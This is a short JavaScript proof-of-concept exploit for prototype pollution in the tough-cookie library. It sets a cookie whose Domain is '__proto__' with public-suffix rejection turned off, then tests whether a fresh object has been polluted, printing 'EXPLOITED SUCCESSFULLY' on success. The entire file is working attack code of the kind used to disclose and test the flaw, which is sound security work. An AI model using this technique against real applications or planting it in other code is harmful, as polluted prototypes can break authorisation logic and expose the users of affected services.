const tough = require('tough-cookie');

function exploitPrototypePollution() {
  const jar = new tough.CookieJar(undefined, {
    rejectPublicSuffixes: false
  });

  // Attempt to pollute the Object prototype
  jar.setCookieSync(
    "Slonser=polluted; Domain=__proto__; Path=/notauth",
    "https://__proto__/admin"
  );

  // The following cookie set is irrelevant to the exploit but demonstrates normal behavior
  jar.setCookieSync(
    "Auth=Lol; Domain=google.com; Path=/notauth",
    "https://google.com/"
  );

  // Test if the prototype has been polluted
  const pollutedObject = {};

  if (pollutedObject["/notauth"] !== undefined) {
    console.log("EXPLOITED SUCCESSFULLY");
  } else {
    console.log("EXPLOIT FAILED");
  }
}

// Run the exploit function
exploitPrototypePollution();
